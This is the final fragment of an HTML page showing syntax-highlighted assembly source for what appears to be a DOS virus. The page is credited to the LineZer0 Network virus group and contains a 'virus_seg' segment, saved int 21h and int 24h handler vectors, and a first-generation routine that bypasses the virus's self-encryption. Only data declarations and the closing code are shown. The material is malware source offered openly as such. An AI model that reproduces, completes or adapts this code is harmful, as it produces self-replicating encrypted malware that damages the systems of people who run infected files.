</span><span class="sc5">int1_segm</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">org_int21</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">int21_offs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">int21_segm</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">org_int24</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">int24_offs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">int24_segm</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">psp</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">size_of_crap</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">end_mem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">256d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">EVEN</span><span class="sc0">                                    </span><span class="sc1">; we want an even stack</span><span class="sc0">
</span><span class="sc5">new_sp</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">skip_encryption</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; Only for first generation</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">start_encryption</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">skip_encryption</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">decrypt</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">virus_seg</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">


</span><span class="sc1">; =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=</span><span class="sc0">
</span><span class="sc1">; &lt;-------------------------\\LineZer0 Network 99//-------------------------&gt;</span><span class="sc0">
</span></div></body>
</html>
